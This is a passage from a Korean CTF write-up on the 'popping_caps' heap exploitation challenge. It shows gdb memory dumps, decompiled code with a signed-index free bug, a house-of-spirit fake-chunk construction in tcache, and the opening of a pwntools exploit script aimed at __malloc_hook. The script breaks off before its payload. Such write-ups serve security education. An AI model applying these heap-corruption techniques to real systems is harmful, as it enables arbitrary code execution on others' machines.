punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\ngdb<span class=\"token operator\">-</span>peda$ x<span class=\"token operator\">/</span><span class=\"token number\">40</span>gx <span class=\"token number\">0x5577632b8000</span>\n<span class=\"token number\">0x5577632b8000</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000251</span>\n<span class=\"token number\">0x5577632b8010</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8020</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8030</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8040</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000100</span>\n<span class=\"token number\">0x5577632b8050</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8060</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8070</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8080</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8090</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80a0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80b0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80c0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80d0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80e0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b80f0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8100</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8110</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8120</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8130</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span></code></pre></div>\n<ul>\n<li>0x3a8 만큼의 할당을 한후 해제를 하여 해당 tcache counter에 추가 된 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"fake-chunk를-만들기-위해-malloc0x3a8-하는-이유\" style=\"position:relative;\"><a href=\"#fake-chunk%EB%A5%BC-%EB%A7%8C%EB%93%A4%EA%B8%B0-%EC%9C%84%ED%95%B4-malloc0x3a8-%ED%95%98%EB%8A%94-%EC%9D%B4%EC%9C%A0\" aria-label=\"fake chunk를 만들기 위해 malloc0x3a8 하는 이유 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fake chunk를 만들기 위해 malloc(0x3a8) 하는 이유</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAACF0lEQVQozz3M3UtTcRzH8S86QroIKhQptiPu2DaZhgypi82H3INu5+y4h6N7wuVca4ssE7ecUCBZYNCTF15Myh5ACDT6Iwq67FoQE5eSeZGSy3mOv08Y5Bvety+yIk1vfwgTM1+9U8Wstdb26c2p+zFoVq5Cyo39nKJtc8WHwsKJWYC2l5fnv62u4vv6Oopra9goFrG9tYXfOzsol0pQymWQZHUTcPkshsKvMOFojRARgejjw6UFfNnrKUy9owo5QgSYl4AEgJtQlGEAGeztjf7a3JxQd3fHsb+fR6k0TnbLpbk2S8esvz2wKEvyfN9g/LXkib5vbLWsdAj+l91C35zb118wX0t+rnPZF89Vn5mura55evJ0TYGIrNNPnhGA48kp+NArh+AQgwhHYkhk0pAjCegMTeiVBxAeSMIfSaHHk4NHvAePfxJNLVfA8Q3gTc0PqLKKRsZyVQAqGVBJrk6HIvSIilvsV+W+lBqKptVkKKMK7RLzRxJqdDCl3L4VVwLh7KHbl1edQlZptnT90dbz4HjTXZ3eQBxv1BxubNDR5BF9zBcMMUmOsVgqw4ZuDLM7k2PMOxBg/fEMuz6SZaOPHjM5OcN80efMFXzBTC3dB9p6PTi+Mf8P1Bs19L82WydEsRe2Lg9sDglOIQibywut4SLa7V443AF0OGU0mFpwnqvDEaSrv3DA8Ubo9IY8xxuJ4w3H4F9g9AzkHHvAzgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/29d83927c90cc9acdbc8d783d2b62255/37523/4.png\"\n        srcset=\"/static/29d83927c90cc9acdbc8d783d2b62255/e9ff0/4.png 180w,\n/static/29d83927c90cc9acdbc8d783d2b62255/f21e7/4.png 360w,\n/static/29d83927c90cc9acdbc8d783d2b62255/37523/4.png 720w,\n/static/29d83927c90cc9acdbc8d783d2b62255/9a1cf/4.png 924w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>house of spirit 공격 기법에 관한 것이며 tcachebin에 삽입 될 fake chunk를 해제하고 다음 malloc을 바탕으로 원하는 곳을 할당할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ x<span class=\"token operator\">/</span><span class=\"token number\">100</span>gx <span class=\"token number\">0x5577632b8000</span>\n<span class=\"token number\">0x5577632b8000</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000251</span>\n<span class=\"token number\">0x5577632b8010</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8020</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8030</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8040</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000100</span>\n<span class=\"token number\">0x5577632b8050</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8060</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token number\">0x5577632b8210</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00005577632b8260</span>\n<span class=\"token number\">0x5577632b8220</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8230</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8240</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8250</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00000000000003b1</span>\n<span class=\"token number\">0x5577632b8260</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8270</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8280</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8290</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82a0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82b0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82c0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82d0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82e0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b82f0</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8300</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x5577632b8310</span><span class=\"token operator\">:</span> <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\ngdb<span class=\"token operator\">-</span>peda$ distance <span class=\"token number\">0x5577632b8050</span> <span class=\"token number\">0x5577632b8260</span> \nFrom <span class=\"token number\">0x5577632b8050</span> to <span class=\"token number\">0x5577632b8260</span><span class=\"token operator\">:</span> <span class=\"token number\">528</span> bytes<span class=\"token punctuation\">,</span> <span class=\"token number\">132</span> dwords\ngdb<span class=\"token operator\">-</span>peda$</code></pre></div>\n<ul>\n<li><code class=\"language-text\">0x3a8</code> 크기의 동적 할당을 한 후 해제하여 해당 tcache 힙 청크가 생긴 것을 확인할 수 있으며 우리는 <code class=\"language-text\">0x100</code> 을 size로 두어 fake chunk를 만들어야 하기 때문에 528 바이트 차이나는 부분 <code class=\"language-text\">0x5577632b8050</code> 메모리 에 참조하여 해제를 진행한다.</li>\n</ul>\n<h2 id=\"integer-issue\" style=\"position:relative;\"><a href=\"#integer-issue\" aria-label=\"integer issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>integer issue</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v4 <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Whats in a free: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      ptr <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>v8<span class=\"token punctuation\">[</span><span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">==</span> buf <span class=\"token punctuation\">)</span>\n        buf <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n__int64 <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-30h]</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span>\n\n  v2 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">atol</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>read_num의 signed 처리를 진행하기 때문에 <code class=\"language-text\">v8</code> 주소 참조가 음수도 가능하여 다른 메모리 주소를 참조할 수 있다.</li>\n<li><code class=\"language-text\">-0x210</code> 범위에 주소 번지를 해제하여 fake chunk를 구성 한다.</li>\n<li>fake chunk 크기에 맞게 끔 malloc(0xf8) 할당한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ tcachebins\ntcachebins\n<span class=\"token number\">0x100</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> <span class=\"token number\">0x55d0c72b0050</span> ◂— <span class=\"token number\">0x0</span>\n<span class=\"token number\">0x3b0</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> <span class=\"token number\">0x55d0c72b0260</span> ◂— <span class=\"token number\">0x0</span></code></pre></div>\n<h2 id=\"writep64malloc_hook\" style=\"position:relative;\"><a href=\"#writep64malloc_hook\" aria-label=\"writep64malloc_hook permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>write(p64(malloc_hook))</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60.55555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABc0lEQVQoz43S226CQBAGYN/DpCdBAVGDLRZQQCzYVl0QFnY5uSwn+/5v0LT2stImc/vln38yvQzOHVPyoY4TA1FbA4DTjqzq8/JmOJ6wwvSW4a5ND4DwAKCz8w4+TkhT1Gd1ZQgzCecU5yRAKcOJN4PR79iNYgCx8w5AEOG8SItK0S1xvsjKNiVllJ5YYXIVe2HsBvh177kQYVLmZaPoa1GSs7LNaIXzoguDAB2Okf0O9scwJtWpalXDGktyUtTxif4jGWJn57oQp7ShzYdmbkRpkVXnjFbor2QMfGR/d06KitStZmzGkpzSOiFllBGWv45dGB98ZG13IEAXrBqW+IWbH9yR7IYx8NFmu3MhSoua1GfNtC4HS0iJurEXYi+I7DfghXFGG9peOsv5d+eva3es/bLcrlfO0rRN+1VZmqpuCdM5K0wV3XperWXNeBgJN4MrH7Z64R+VyWymcEOTG+kc9zQbL3hmfsfw/Xu2f8d0vOcnyzeh3kGuSVIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/bd5b84a5c4222a1a2cac80b404091de2/37523/5.png\"\n        srcset=\"/static/bd5b84a5c4222a1a2cac80b404091de2/e9ff0/5.png 180w,\n/static/bd5b84a5c4222a1a2cac80b404091de2/f21e7/5.png 360w,\n/static/bd5b84a5c4222a1a2cac80b404091de2/37523/5.png 720w,\n/static/bd5b84a5c4222a1a2cac80b404091de2/d52e5/5.png 848w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>tcache_perthread_struct 의 head 영역의 0x20 크기 부분에 __malloc_hook 주소 가 삽입되 었기 떄문에 tcachebins를 확인한 결과 0x20으로 할당된 것을 확인할 수 있다.</li>\n<li>해당 상태에서 0x10 크기로 할당을 받게 된다면 __malloc_hook 영역에 할당하여 원하는 값으로 조작할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">from pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">malloc</span></span>\ndef <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"How many: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">free</span></span>\ndef <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Whats in a free: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token expression\">Write</span></span>\ndef <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">sla</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">sa</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Read me in: \"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token operator\">:</span>        \n    context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\n    <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">context</span><span class=\"token expression\"><span class=\"token punctuation\">.</span>arch <span class=\"token operator\">=</span> </span><span class=\"token string\">'amd64'</span></span>\n\n    LOCAL <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    DEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n    s       <span class=\"token operator\">=</span> lambda data               <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>       \n    sa      <span class=\"token operator\">=</span> lambda delim<span class=\"token punctuation\">,</span>data         <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendafter</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sl      <span class=\"token operator\">=</span> lambda data               <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendline</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sla     <span class=\"token operator\">=</span> lambda delim<span class=\"token punctuation\">,</span>data         <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    r       <span class=\"token operator\">=</span> lambda num<span class=\"token operator\">=</span><span class=\"token number\">4096</span>           <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n    rn      <span class=\"token operator\">=</span> lambda                    <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">recvline</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ru      <span class=\"token operator\">=</span> lambda delims<span class=\"token punctuation\">,</span> drop<span class=\"token operator\">=</span>True  <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">recvuntil</span><span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span> drop<span class=\"token punctuation\">)</span>\n    irt     <span class=\"token operator\">=</span> lambda                    <span class=\"token operator\">:</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    uu32    <span class=\"token operator\">=</span> lambda data   <span class=\"token operator\">:</span><span class=\"token function\">u32</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">ljust</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    uu64    <span class=\"token operator\">=</span> lambda data   <span class=\"token operator\">:</span><span class=\"token function\">u64</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span><span class=\"token function\">ljust</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    leak    <span class=\"token operator\">=</span> lambda name<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">:</span>log<span class=\"token punctuation\">.</span><span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token string\">'{} : {:#x}'</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> LOCAL<span class=\"token operator\">:</span>\n        <span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">p</span> <span class=\"token expression\"><span class=\"token operator\">=</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">'./pwn'</span><span class=\"token expression\"><span class=\"token punctuation\">,</span>env<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><span class=\"token string\">'LD_PRELOAD'</span><span class=\"token expression\"><span class=\"token operator\">:</span></span><span class=\"token string\">'./libc-2.23.so'</span><span class=\"token expression\"><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span></span>\n        p <span class=\"token operator\">=</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./popping_caps'</span><span class=\"token punctuation\">)</span>\n        e <span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">e</span> <span class=\"token expression\"><span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">'./popping_caps'</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n        <span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">libc</span> <span class=\"token expression\"><span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n    <span class=\"token keyword\">else</span><span class=\"token operator\">:</span>\n        p <span class=\"token operator\">=</span> <span class=\"token function\">remote</span><span class=\"token punctuation\">(</span><span class=\"token string\">'172.25.87.200'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n        e <span class=\"token operator\">=</span> <span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token macro 